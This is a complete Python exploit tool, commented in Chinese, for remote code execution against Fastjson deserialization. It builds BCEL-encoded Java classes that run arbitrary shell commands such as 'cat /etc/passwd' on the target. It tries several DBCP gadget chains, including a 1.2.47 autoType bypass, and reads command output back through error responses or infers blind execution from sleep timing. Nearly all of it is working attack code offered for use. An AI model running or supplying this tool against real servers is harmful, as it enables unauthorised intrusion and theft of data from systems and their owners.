#!/usr/bin/env python3
"""
bcel_fastjson.py — Fastjson 无回连利用工具

通过 BCEL ClassLoader 链在目标 JVM 本地执行命令，
不需要目标回连攻击机。适用于 NAT/防火墙环境。

原理:
  Fastjson 解析 @type 时实例化 BasicDataSource，
  其 driverClassLoader 设为 BCEL ClassLoader，
  driverClassName 设为 BCEL 编码的恶意 class，
  目标 JVM 本地加载并执行 class 中的 static 代码块。

支持的 gadget 链（自动遍历尝试）:
  1. org.apache.tomcat.dbcp.dbcp2.BasicDataSource  (Spring Boot + tomcat-dbcp2)
  2. org.apache.tomcat.dbcp.dbcp.BasicDataSource   (旧版 tomcat-dbcp)
  3. org.apache.commons.dbcp2.BasicDataSource      (commons-dbcp2)
  4. org.apache.commons.dbcp.BasicDataSource        (commons-dbcp1)
  5. com.mchange.v2.c3p0.JndiRefForwardingDataSource (c3p0)

验证方式:
  - 优先: 在目标上执行命令并将结果写入 /tmp，然后用第二个 payload 读取
  - 备选: 延时验证（执行 sleep，看响应时间）
  - 兜底: DNS 外带（如果配置了 dnslog 域名）

用法:
    python3 /opt/bcel_fastjson.py http://target:8090/ id
    python3 /opt/bcel_fastjson.py http://target:8090/ "cat /etc/passwd"
    python3 /opt/bcel_fastjson.py http://target:8090/ id --verify-only

环境要求: javac (JDK 已在 toolbox 中预装)
"""

import argparse
import base64
import gzip
import io
import json
import os
import subprocess
import sys
import tempfile
import time
import urllib.request
import urllib.error


BCEL_CHAR_MAP = 'ABCDEFGHIJKLMNOP'


def bcel_encode(class_bytes: bytes) -> str:
    """
    BCEL 编码: gzip 压缩 class 字节码，然后用自定义编码。

    规则（对应 com.sun.org.apache.bcel.internal.classfile.Utility.encode）:
      1. gzip 压缩
      2. 每个字节: 如果是 Java 标识符字符(字母数字_)且不是$, 直接输出
         否则输出 $ + 高4位映射(A-P) + 低4位映射(A-P)
    """
    buf = io.BytesIO()
    with gzip.GzipFile(fileobj=buf, mode='wb') as f:
        f.write(class_bytes)
    compressed = buf.getvalue()

    result = []
    for b in compressed:
        ch = chr(b)
        if ch.isalnum() or ch == '_':
            result.append(ch)
        else:
            hi = (b >> 4) & 0xF
            lo = b & 0xF
            result.append('$')
            result.append(BCEL_CHAR_MAP[hi])
            result.append(BCEL_CHAR_MAP[lo])

    return '$$BCEL$$' + ''.join(result)



TARGET_CLASS_VERSION = 52


def patch_class_version(class_bytes: bytes, target_major: int = TARGET_CLASS_VERSION) -> bytes:
    """
    将 class 文件的版本号降级到目标版本。

    class 文件格式:
      bytes 0-3: magic (0xCAFEBABE)
      bytes 4-5: minor version
      bytes 6-7: major version

    JDK 21 编译出 major=65，但目标 JDK 8u102 只支持 <=52。
    恶意 class 只用了 Runtime.exec 等基础 API，降版本号完全安全。
    """
    if len(class_bytes) < 8:
        return class_bytes

    magic = class_bytes[:4]
    if magic != b'\xca\xfe\xba\xbe':
        return class_bytes

    current_major = int.from_bytes(class_bytes[6:8], 'big')
    if current_major <= target_major:
        return class_bytes

    patched = (
        class_bytes[:4]
        + (0).to_bytes(2, 'big')
        + target_major.to_bytes(2, 'big')
        + class_bytes[8:]
    )
    return patched


def compile_evil_class(command: str, class_name: str = "Evil") -> bytes | None:
    """
    编译恶意 Java 类，返回 class 字节码。

    class 的 static 块执行指定命令，结果写入 /tmp/bcel_rce_output.txt。
    """
    safe_cmd = command.replace('\\', '\\\\').replace('"', '\\"')

    java_code = f'''import java.io.*;

public class {class_name} {{
    static {{
        try {{
            String[] cmd = {{"/bin/bash", "-c", "{safe_cmd}"}};
            Process p = Runtime.getRuntime().exec(cmd);
            BufferedReader br = new BufferedReader(
                new InputStreamReader(p.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = br.readLine()) != null) {{
                sb.append(line).append("\\n");
            }}
            p.waitFor();
            // 将结果写入临时文件（用于后续读取验证）
            FileWriter fw = new FileWriter("/tmp/bcel_rce_output.txt");
            fw.write(sb.toString());
            fw.close();
        }} catch (Exception e) {{
            try {{
                FileWriter fw = new FileWriter("/tmp/bcel_rce_error.txt");
                fw.write(e.toString());
                fw.close();
            }} catch (Exception ignored) {{}}
        }}
    }}
}}
'''

    tmpdir = tempfile.mkdtemp(prefix="bcel_")
    try:
        java_file = os.path.join(tmpdir, f"{class_name}.java")
        with open(java_file, 'w') as f:
            f.write(java_code)

        result = subprocess.run(
            ['javac', java_file],
            capture_output=True, text=True, timeout=30, cwd=tmpdir,
        )
        if result.returncode != 0:
            print(f"ERROR: javac 编译失败:\n{result.stderr}", file=sys.stderr)
            return None

        class_file = os.path.join(tmpdir, f"{class_name}.class")
        with open(class_file, 'rb') as f:
            raw = f.read()
        return patch_class_version(raw)
    finally:
        import shutil
        shutil.rmtree(tmpdir, ignore_errors=True)


def compile_read_class(filepath: str, class_name: str = "ReadFile") -> bytes | None:
    """编译一个读取文件内容并通过异常回显的 Java 类"""

    java_code = f'''import java.io.*;
import java.nio.file.*;

public class {class_name} {{
    static {{
        try {{
            String content = new String(Files.readAllBytes(Paths.get("{filepath}")));
            // 通过抛出异常让内容出现在 HTTP 错误响应中
            throw new RuntimeException("BCEL_RCE_OUTPUT:" + content);
        }} catch (RuntimeException e) {{
            throw e;
        }} catch (Exception e) {{
            throw new RuntimeException("BCEL_READ_ERROR:" + e.toString());
        }}
    }}
}}
'''

    tmpdir = tempfile.mkdtemp(prefix="bcel_read_")
    try:
        java_file = os.path.join(tmpdir, f"{class_name}.java")
        with open(java_file, 'w') as f:
            f.write(java_code)

        result = subprocess.run(
            ['javac', java_file],
            capture_output=True, text=True, timeout=30, cwd=tmpdir,
        )
        if result.returncode != 0:
            return None

        class_file = os.path.join(tmpdir, f"{class_name}.class")
        with open(class_file, 'rb') as f:
            raw = f.read()
        return patch_class_version(raw)
    finally:
        import shutil
        shutil.rmtree(tmpdir, ignore_errors=True)



DATASOURCE_CLASSES = [
    "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
    "org.apache.tomcat.dbcp.dbcp.BasicDataSource",
    "org.apache.commons.dbcp2.BasicDataSource",
    "org.apache.commons.dbcp.BasicDataSource",
]

BCEL_CLASSLOADER = "com.sun.org.apache.bcel.internal.util.ClassLoader"


def gen_bcel_payload(bcel_str: str, datasource_class: str) -> str:
    """生成 BasicDataSource + BCEL ClassLoader 的 JSON payload（1.2.24 直接版）"""
    payload = {
        "@type": datasource_class,
        "driverClassLoader": {
            "@type": BCEL_CLASSLOADER,
        },
        "driverClassName": bcel_str,
    }
    return json.dumps(payload, ensure_ascii=False)


def gen_bcel_payload_bypass(bcel_str: str, datasource_class: str) -> str:
    """
    生成 1.2.47 绕过版 payload。

    原理: 先用 java.lang.Class 将 BCEL ClassLoader 和 BasicDataSource 类
    写入 Fastjson 内部类缓存（Mapping），绕过 autoType 检查。
    """
    payload = {
        "x": {"@type": "java.lang.Class", "val": BCEL_CLASSLOADER},
        "a": {"@type": "java.lang.Class", "val": datasource_class},
        "b": {
            "@type": datasource_class,
            "driverClassLoader": {
                "@type": BCEL_CLASSLOADER,
            },
            "driverClassName": bcel_str,
        },
    }
    return json.dumps(payload, ensure_ascii=False)


def gen_sleep_payload(seconds: int, datasource_class: str) -> str:
    """生成延时验证 payload（用 Thread.sleep 代替命令执行）"""
    java_code = f'''public class SleepTest {{
    static {{
        try {{ Thread.sleep({seconds * 1000}); }} catch (Exception e) {{}}
    }}
}}'''

    tmpdir = tempfile.mkdtemp(prefix="bcel_sleep_")
    try:
        java_file = os.path.join(tmpdir, "SleepTest.java")
        with open(java_file, 'w') as f:
            f.write(java_code)

        result = subprocess.run(
            ['javac', java_file],
            capture_output=True, text=True, timeout=30, cwd=tmpdir,
        )
        if result.returncode != 0:
            return ""

        with open(os.path.join(tmpdir, "SleepTest.class"), 'rb') as f:
            class_bytes = patch_class_version(f.read())

        bcel_str = bcel_encode(class_bytes)
        return gen_bcel_payload(bcel_str, datasource_class)
    finally:
        import shutil
        shutil.rmtree(tmpdir, ignore_errors=True)



def send_payload(target_url: str, payload_json: str, timeout: int = 15) -> tuple[int, str, float]:
    """
    发送 JSON payload 到目标。

    Returns: (status_code, response_body, elapsed_seconds)
    """
    start = time.time()
    try:
        result = subprocess.run(
            [
                'curl', '-s', '-X', 'POST', target_url,
                '-H', 'Content-Type: application/json',
                '-d', payload_json,
                '-w', '\n__HTTP_CODE:%{http_code}',
                '--max-time', str(timeout),
            ],
            capture_output=True, text=True, timeout=timeout + 5,
        )
        elapsed = time.time() - start
        output = result.stdout

        if '__HTTP_CODE:' in output:
            parts = output.rsplit('__HTTP_CODE:', 1)
            body = parts[0].strip()
            try:
                status = int(parts[1].strip())
            except ValueError:
                status = 0
        else:
            body = output
            status = 0

        return status, body, elapsed
    except Exception as e:
        elapsed = time.time() - start
        return 0, str(e), elapsed



def try_bcel_chains(target_url: str, command: str) -> bool:
    """尝试所有 BCEL gadget 链（自动区分 1.2.24 直接版和 1.2.47 绕过版）"""
    print(f"\n{'='*60}")
    print(f"目标: {target_url}")
    print(f"命令: {command}")
    print(f"{'='*60}")

    print("\n[1/4] 编译恶意 Java 类...")
    class_bytes = compile_evil_class(command)
    if not class_bytes:
        print("❌ 编译失败")
        return False
    print(f"✅ 编译成功 ({len(class_bytes)} bytes)")

    print("\n[2/4] BCEL 编码...")
    bcel_str = bcel_encode(class_bytes)
    print(f"✅ 编码完成 ({len(bcel_str)} chars)")

    total_chains = len(DATASOURCE_CLASSES)
    print(f"\n[3/4] 尝试 {total_chains} 种 gadget 链 × 2 种模式（直接 + 绕过）...")
    success_chain = None
    need_bypass = False

    for i, ds_class in enumerate(DATASOURCE_CLASSES, 1):
        short_name = ds_class.rsplit('.', 1)[-1]
        chain_name = ds_class.rsplit('.', 2)[-2] + "." + short_name

        if not need_bypass:
            print(f"\n  --- 链 {i}/{total_chains}: {chain_name} [直接模式] ---")
            payload = gen_bcel_payload(bcel_str, ds_class)
            status, body, elapsed = send_payload(target_url, payload)
            print(f"  HTTP {status} | {elapsed:.1f}s | {len(body)} bytes")

            result = _analyze_response(body, status, short_name)
            if result == "success":
                success_chain = chain_name
                break
            elif result == "autoType_blocked":
                print(f"  ⚠️ autoType 被限制，切换到 1.2.47 绕过模式")
                need_bypass = True
            elif result == "class_not_found":
                continue
            elif result == "bcel_blocked":
                continue
            elif result == "maybe_success":
                success_chain = chain_name
                break

        print(f"\n  --- 链 {i}/{total_chains}: {chain_name} [1.2.47 绕过模式] ---")
        payload = gen_bcel_payload_bypass(bcel_str, ds_class)
        status, body, elapsed = send_payload(target_url, payload)
        print(f"  HTTP {status} | {elapsed:.1f}s | {len(body)} bytes")

        result = _analyze_response(body, status, short_name)
        if result in ("success", "maybe_success"):
            success_chain = chain_name
            break
        elif result == "class_not_found":
            continue
        elif result == "bcel_blocked":
            print(f"  ❌ BCEL ClassLoader 不可用（JDK 版本可能 >= 8u251）")
            break

    print(f"\n[4/4] 验证命令执行...")

    if success_chain:
        print(f"  可能成功的链: {success_chain}")
        verified = try_read_output(target_url, bcel_str, success_chain)
        if verified:
            return True

    print("\n  尝试延时验证...")
    if verify_with_sleep(target_url, need_bypass):
        print("  ✅ 延时验证成功！目标存在盲 RCE")
        print(f"  命令 '{command}' 已在目标上执行（盲执行，无直接回显）")
        return True

    print("  ❌ 所有验证方式均未确认 RCE")
    return False


def _analyze_response(body: str, status: int, short_name: str) -> str:
    """
    分析 HTTP 响应，返回结果类型:
      success         - 直接回显成功
      maybe_success   - 没报错，可能成功了
      autoType_blocked - autoType 被禁
      class_not_found  - classpath 中无目标类
      bcel_blocked     - BCEL ClassLoader 被禁
      failed           - 其他失败
    """
    body_lower = body.lower()

    if "bcel_rce_output" in body_lower:
        print(f"  🎯 直接回显！")
        return "success"

    if "autoType is not support" in body_lower or "autotype is not support" in body_lower:
        print(f"  ❌ autoType 被禁用")
        return "autoType_blocked"

    if status == 500 and ("classnotfound" in body_lower or "class not found" in body_lower):
        print(f"  ❌ classpath 中无 {short_name}")
        return "class_not_found"

    if status == 500 and "bcel" in body_lower and ("removed" in body_lower or "not found" in body_lower):
        print(f"  ❌ BCEL ClassLoader 不可用")
        return "bcel_blocked"

    if status == 200:
        print(f"  ⚠️ 200 OK（可能成功执行，无报错）")
        return "maybe_success"

    if status == 500 and "type not match" in body_lower:
        print(f"  ⚠️ type not match（autoType 已启用，但类加载可能成功）")
        return "maybe_success"

    print(f"  ⚠️ 未明确判定 (HTTP {status})")
    return "failed"


def try_read_output(target_url: str, bcel_str: str, success_chain: str) -> bool:
    """尝试通过第二个 payload 读取命令输出文件"""
    print("  尝试读取 /tmp/bcel_rce_output.txt ...")

    read_bytes = compile_read_class("/tmp/bcel_rce_output.txt")
    if not read_bytes:
        return False

    read_bcel = bcel_encode(read_bytes)
    ds_class = next(
        (c for c in DATASOURCE_CLASSES if success_chain in c),
        DATASOURCE_CLASSES[0],
    )

    for label, payload in [
        ("直接", gen_bcel_payload(read_bcel, ds_class)),
        ("绕过", gen_bcel_payload_bypass(read_bcel, ds_class)),
    ]:
        status, body, elapsed = send_payload(target_url, payload)

        if "BCEL_RCE_OUTPUT:" in body:
            output = body.split("BCEL_RCE_OUTPUT:", 1)[1]
            for suffix in ['"]', '"', "']", "'"]:
                if output.endswith(suffix):
                    output = output[:-len(suffix)]
            print(f"\n{'='*60}")
            print(f"✅ RCE 成功！命令输出 ({label}模式):")
            print(f"{'='*60}")
            print(output.strip())
            print(f"{'='*60}")
            return True

    if "BCEL_READ_ERROR" in body:
        print(f"  文件读取失败（命令可能未执行或路径不对）")

    return False


def verify_with_sleep(target_url: str, use_bypass: bool = False, sleep_seconds: int = 5) -> bool:
    """通过延时判断是否存在盲 RCE"""
    _, _, baseline = send_payload(
        target_url,
        '{"test": 1}',
        timeout=10,
    )
    print(f"  基线响应时间: {baseline:.1f}s")

    for ds_class in DATASOURCE_CLASSES:
        sleep_payload_direct = gen_sleep_payload(sleep_seconds, ds_class)
        if not sleep_payload_direct:
            continue

        short = ds_class.rsplit('.', 1)[-1]

        modes = []
        if not use_bypass:
            modes.append(("直接", sleep_payload_direct))
        sleep_bcel_str = json.loads(sleep_payload_direct).get("driverClassName", "")
        if sleep_bcel_str:
            bypass_payload = gen_bcel_payload_bypass(sleep_bcel_str, ds_class)
            modes.append(("绕过", bypass_payload))

        for label, payload in modes:
            print(f"  发送 sleep({sleep_seconds}s) via {short} [{label}]...")
            _, _, elapsed = send_payload(target_url, payload, timeout=sleep_seconds + 10)
            print(f"  响应时间: {elapsed:.1f}s")

            if elapsed >= baseline + sleep_seconds * 0.8:
                return True

    return False


def detect_fastjson(target_url: str) -> bool:
    """快速检测目标是否使用 Fastjson"""
    print("\n[预检] 检测 Fastjson...")
    payload = '{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}'
    status, body, _ = send_payload(target_url, payload)

    indicators = ["fastjson", "com.alibaba.fastjson", "type not match", "autoType"]
    body_lower = body.lower()

    for ind in indicators:
        if ind.lower() in body_lower:
            print(f"  ✅ 检测到 Fastjson (特征: {ind})")
            return True

    if status in (400, 500) and "@type" in body.lower():
        print(f"  ✅ 可能是 Fastjson (HTTP {status})")
        return True

    print(f"  ⚠️ 未明确检测到 Fastjson (HTTP {status})")
    return False


def main():
    parser = argparse.ArgumentParser(
        description="Fastjson BCEL 无回连利用工具",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例:
    %(prog)s http://192.168.1.100:8090/ id
    %(prog)s http://target:8090/ "cat /etc/passwd"
    %(prog)s http://target:8090/ id --detect-only
        """,
    )
    parser.add_argument("target", help="目标 URL (如 http://target:8090/)")
    parser.add_argument("command", nargs="?", default="id", help="要执行的命令 (默认: id)")
    parser.add_argument("--detect-only", action="store_true", help="只检测不利用")
    args = parser.parse_args()

    target = args.target.rstrip('/')
    if not target.endswith('/'):
        target += '/'

    print("=" * 60)
    print("  Fastjson BCEL 无回连利用工具")
    print("  不需要目标回连攻击机")
    print("=" * 60)

    is_fastjson = detect_fastjson(target)

    if args.detect_only:
        sys.exit(0 if is_fastjson else 1)

    if not is_fastjson:
        print("\n⚠️ 未确认 Fastjson，仍尝试利用...")

    success = try_bcel_chains(target, args.command)

    if success:
        print("\n✅ 利用成功")
        sys.exit(0)
    else:
        print("\n❌ 所有 BCEL 链均未成功")
        if is_fastjson:
            print("漏洞确认存在，但当前 gadget 链在目标 classpath 中不可用。")
            print("可能原因: 目标没有 tomcat-dbcp / commons-dbcp / c3p0")
            print("建议: 配置 LHOST 使用 JNDI 利用方式")
        sys.exit(1)


if __name__ == "__main__":
    main()